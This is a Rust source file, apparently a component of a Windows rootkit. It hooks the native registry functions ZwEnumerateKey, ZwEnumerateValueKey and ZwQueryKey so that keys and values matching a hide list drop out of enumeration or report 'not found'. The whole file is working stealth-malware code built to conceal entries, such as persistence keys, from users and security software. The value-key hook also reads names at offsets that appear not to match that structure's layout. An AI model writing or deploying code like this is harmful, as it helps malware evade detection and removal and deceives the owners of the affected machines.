use std::ffi::c_void;
use std::{mem, slice};

use windows::Win32::Foundation::HANDLE;

use crate::config::should_hide_reg;

const STATUS_OBJECT_NAME_NOT_FOUND: i32 = 0xC0000034u32 as i32;

type ZwEnumerateKeyType = unsafe extern "system" fn(
    key: HANDLE,
    index: u32,
    key_information_class: u32,
    key_information: *mut c_void,
    key_information_length: u32,
    result_length: *mut u32,
) -> i32;

type ZwEnumerateValueKeyType = unsafe extern "system" fn(
    key: HANDLE,
    index: u32,
    key_value_information_class: u32,
    key_value_information: *mut c_void,
    key_value_information_length: u32,
    result_length: *mut u32,
) -> i32;

type ZwQueryKeyType = unsafe extern "system" fn(
    key: HANDLE,
    key_information_class: u32,
    key_information: *mut c_void,
    key_information_length: u32,
    result_length: *mut u32,
) -> i32;

pub unsafe extern "system" fn hook_zw_enumerate_key(
    key: HANDLE,
    index: u32,
    key_information_class: u32,
    key_information: *mut c_void,
    key_information_length: u32,
    result_length: *mut u32,
) -> i32 {
    let state_guard = crate::ZW_ENUMERATE_KEY
        .lock()
        .unwrap();

    let state = state_guard
        .as_ref()
        .unwrap();

    unsafe {
        if key_information_class == 1 {
            state.unhook();

            let original_func = mem::transmute::<usize, ZwEnumerateKeyType>(state.target);
            let result = original_func(
                key,
                index,
                key_information_class,
                key_information,
                key_information_length,
                result_length
            );

            state.repatch(hook_zw_enumerate_key as usize);

            return result;
        }

        let mut key_info = vec![0u8; 1024];
        let mut shown_keys = 0u32;
        let mut new_index = 0u32;

        loop {
            state.unhook();

            let original_func = mem::transmute::<usize, ZwEnumerateKeyType>(state.target);
            let status = original_func(
                key,
                new_index,
                0,
                key_info.as_mut_ptr() as *mut c_void,
                key_info.len() as u32,
                result_length
            );

            state.repatch(hook_zw_enumerate_key as usize);

            if status != 0 {
                state.unhook();

                let original_func = mem::transmute::<usize, ZwEnumerateKeyType>(state.target);
                let result = original_func(
                    key,
                    new_index,
                    key_information_class,
                    key_information,
                    key_information_length,
                    result_length
                );

                state.repatch(hook_zw_enumerate_key as usize);

                return result;
            }

            let name = get_name_from_key_bytes(&key_info);
            if !should_hide_reg(&name) {
                if shown_keys == index {
                    break;
                }

                shown_keys += 1;
            }

            new_index += 1;
        }

        state.unhook();

        let original_func = mem::transmute::<usize, ZwEnumerateKeyType>(state.target);
        let result = original_func(
            key,
            new_index,
            key_information_class,
            key_information,
            key_information_length,
            result_length
        );

        state.repatch(hook_zw_enumerate_key as usize);

        result
    }
}

pub unsafe extern "system" fn hook_zw_enumerate_value_key(
    key: HANDLE,
    index: u32,
    key_value_information_class: u32,
    key_value_information: *mut c_void,
    key_value_information_length: u32,
    result_length: *mut u32,
) -> i32 {
    let state_guard = crate::ZW_ENUMERATE_VALUE_KEY
        .lock()
        .unwrap();

    let state = state_guard
        .as_ref()
        .unwrap();

    unsafe {
        let mut key_info = vec![0u8; 1024];
        let mut shown_keys = 0u32;
        let mut new_index = 0u32;

        loop {
            state.unhook();

            let original_func = mem::transmute::<usize, ZwEnumerateValueKeyType>(state.target);
            let status = original_func(
                key,
                new_index,
                0,
                key_info.as_mut_ptr() as *mut c_void,
                key_info.len() as u32,
                result_length
            );

            state.repatch(hook_zw_enumerate_value_key as usize);

            if status != 0 {
                state.unhook();

                let original_func = mem::transmute::<usize, ZwEnumerateKeyType>(state.target);
                let result = original_func(
                    key,
                    new_index,
                    key_value_information_class,
                    key_value_information,
                    key_value_information_length,
                    result_length
                );

                state.repatch(hook_zw_enumerate_value_key as usize);

                return result;
            }

            let name = get_name_from_key_bytes(&key_info);
            if !should_hide_reg(&name) {
                if shown_keys == index {
                    break;
                }

                shown_keys += 1;
            }

            new_index += 1;
        }

        state.unhook();

        let original_func = mem::transmute::<usize, ZwEnumerateKeyType>(state.target);
        let result = original_func(
            key,
            new_index,
            key_value_information_class,
            key_value_information,
            key_value_information_length,
            result_length
        );

        state.repatch(hook_zw_enumerate_value_key as usize);

        result
    }
}

pub unsafe extern "system" fn hook_zw_query_key(
    key: HANDLE,
    key_information_class: u32,
    key_information: *mut c_void,
    key_information_length: u32,
    result_length: *mut u32,
) -> i32 {
    let state_guard = crate::ZW_QUERY_KEY
        .lock()
        .unwrap();

    let state = state_guard
        .as_ref()
        .unwrap();

    unsafe {
        state.unhook();

        let original_func = std::mem::transmute::<usize, ZwQueryKeyType>(state.target);
        let status = original_func(
            key,
            key_information_class,
            key_information,
            key_information_length,
            result_length
        );

        state.repatch(hook_zw_query_key as usize);

        if status == 0 && key_information_class == 3 && !key_information.is_null() {
            let name = get_name_from_key_ptr(key_information);
            if should_hide_reg(&name) {
                return STATUS_OBJECT_NAME_NOT_FOUND;
            }
        }

        status
    }
}

unsafe fn get_name_from_key_bytes(key_info: &[u8]) -> String {
    unsafe {
        let name_len = *(key_info.as_ptr().add(12) as *const u32) as usize / 2;
        let name_ptr = key_info.as_ptr().add(16) as *const u16;

        String::from_utf16_lossy(slice::from_raw_parts(name_ptr, name_len))
    }
}

unsafe fn get_name_from_key_ptr(key_info: *mut c_void) -> String {
    unsafe {
        let name_len = *(key_info as *const u32) as usize / 2;
        let name_ptr = (key_info as *mut u8).add(4) as *const u16;

        String::from_utf16_lossy(std::slice::from_raw_parts(name_ptr, name_len))
    }
}
